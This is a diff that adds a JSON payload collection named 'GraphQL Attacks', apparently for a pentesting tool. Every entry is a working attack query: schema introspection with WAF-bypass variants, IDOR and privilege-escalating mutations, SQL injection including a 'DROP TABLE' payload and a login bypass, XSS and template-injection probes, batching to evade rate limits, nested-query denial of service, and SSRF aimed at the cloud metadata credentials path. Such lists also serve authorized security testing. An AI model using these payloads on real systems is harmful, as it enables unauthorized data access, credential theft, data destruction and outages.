@@ -1,0 +1,34 @@
+{
+  "meta": {
+    "name": "GraphQL Attacks",
+    "icon": "◉",
+    "description": "GraphQL attack payloads covering introspection abuse, injection, DoS via nested queries, SSRF, authorization bypass, and batching attacks.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 22
+  },
+  "payloads": [
+    {"id":1,"code":"{ __schema { types { name } } }","description":"Full schema introspection — dumps all type names; first step in recon","category":"introspection","platform":["any"],"tags":["graphql","introspection","schema","recon"]},
+    {"id":2,"code":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name type { name kind ofType { name kind } } } } } }","description":"Deep schema dump — full introspection including all fields, types, and relationships","category":"introspection","platform":["any"],"tags":["graphql","introspection","full-dump","schema"]},
+    {"id":3,"code":"{ __type(name: \"User\") { name fields { name type { name kind } } } }","description":"Type introspection — dump all fields of a specific type (replace User with target type)","category":"introspection","platform":["any"],"tags":["graphql","introspection","type","fields"]},
+    {"id":4,"code":"fragment frag on __Schema { types { name } } { ...frag }","description":"Fragment-based introspection — some WAFs block __schema but allow fragment introspection","category":"introspection","platform":["any"],"tags":["graphql","introspection","fragment","waf-bypass"]},
+    {"id":5,"code":"{ __schema { types { name } } } #","description":"Introspection with comment suffix — bypass filters that check exact query endings","category":"introspection","platform":["any"],"tags":["graphql","introspection","bypass","comment"]},
+    {"id":6,"code":"{ users { id email password role } }","description":"Direct data dump — query sensitive fields directly; test what fields are accessible without auth","category":"authorization-bypass","platform":["any"],"tags":["graphql","auth","data-dump","fields"]},
+    {"id":7,"code":"{ user(id: 1) { email password resetToken } }","description":"IDOR via GraphQL — access another user's data by changing the ID argument","category":"authorization-bypass","platform":["any"],"tags":["graphql","idor","auth-bypass","id"]},
+    {"id":8,"code":"mutation { updateUser(id: 2, role: \"admin\") { id role } }","description":"Unauthorized mutation — attempt to modify another user's role via mutation","category":"authorization-bypass","platform":["any"],"tags":["graphql","mutation","privilege","role","idor"]},
+    {"id":9,"code":"{ user(id: \"1 OR 1=1\") { id email } }","description":"SQLi via GraphQL argument — inject SQL into GraphQL resolver arguments","category":"injection","platform":["any"],"tags":["graphql","sqli","injection","resolver"]},
+    {"id":10,"code":"{ user(id: \"1; DROP TABLE users--\") { id } }","description":"Stacked query injection via GraphQL — pass destructive SQL through argument","category":"injection","platform":["any"],"tags":["graphql","sqli","stacked","drop","injection"]},
+    {"id":11,"code":"{ search(query: \"<script>alert(1)</script>\") { results } }","description":"XSS via GraphQL — inject script tags into search/text arguments if reflected unsanitized","category":"injection","platform":["any"],"tags":["graphql","xss","injection","reflected"]},
+    {"id":12,"code":"{ search(query: \"{{7*7}}\") { results } }","description":"SSTI via GraphQL argument — template injection through query arguments","category":"injection","platform":["any"],"tags":["graphql","ssti","injection","template"]},
+    {"id":13,"code":"{ a: user(id:1){email} b: user(id:2){email} c: user(id:3){email} d: user(id:4){email} e: user(id:5){email} }","description":"Query aliasing — use GraphQL aliases to enumerate multiple IDs in a single request","category":"enumeration","platform":["any"],"tags":["graphql","alias","enumeration","batch","idor"]},
+    {"id":14,"code":"[{\"query\":\"{user(id:1){email}}\"},{\"query\":\"{user(id:2){email}}\"},{\"query\":\"{user(id:3){email}}\"}]","description":"Batched query array — send multiple operations in one HTTP request to bypass rate limits","category":"enumeration","platform":["any"],"tags":["graphql","batch","rate-limit-bypass","enumeration"]},
+    {"id":15,"code":"{ a1: user{a2: user{a3: user{a4: user{a5: user{email}}}}}}","description":"Deeply nested query — exponential resolver complexity causes CPU/memory DoS","category":"dos","platform":["any"],"tags":["graphql","dos","nested","complexity","resource"]},
+    {"id":16,"code":"query { users { friends { friends { friends { friends { id email } } } } } }","description":"Circular relationship DoS — exploit circular references in schema to exhaust server resources","category":"dos","platform":["any"],"tags":["graphql","dos","circular","recursion","resource"]},
+    {"id":17,"code":"{ importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }","description":"SSRF via GraphQL mutation — trick server into fetching internal URLs via data import resolver","category":"ssrf","platform":["any"],"tags":["graphql","ssrf","metadata","import","resolver"]},
+    {"id":18,"code":"{ webhook(url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\") { response } }","description":"SSRF via webhook/callback argument — any URL-accepting argument can be leveraged for SSRF","category":"ssrf","platform":["any"],"tags":["graphql","ssrf","webhook","aws","metadata"]},
+    {"id":19,"code":"mutation { login(username: \"admin\\\" #\", password: \"anything\") { token } }","description":"Comment injection in mutation argument — terminate SQL query inside resolver with inline comment","category":"injection","platform":["any"],"tags":["graphql","sqli","injection","comment","mutation","auth-bypass"]},
+    {"id":20,"code":"{ __typename }","description":"Minimal introspection probe — __typename works even when full introspection is disabled; confirms GraphQL endpoint","category":"detection","platform":["any"],"tags":["graphql","detection","probe","typename"]},
+    {"id":21,"code":"query IntrospectionQuery { __schema { queryType { name } } }","description":"Named introspection query — some WAFs only block unnamed introspection; add query name to bypass","category":"introspection","platform":["any"],"tags":["graphql","introspection","named","waf-bypass"]},
+    {"id":22,"code":"{ users(filter: {email: {_eq: \"admin@site.com\"}}) { id password } }","description":"Hasura/Prisma filter injection — ORM-style filters may allow unauthorized field access","category":"authorization-bypass","platform":["hasura","prisma"],"tags":["graphql","hasura","prisma","filter","auth-bypass"]}
+  ]
+}
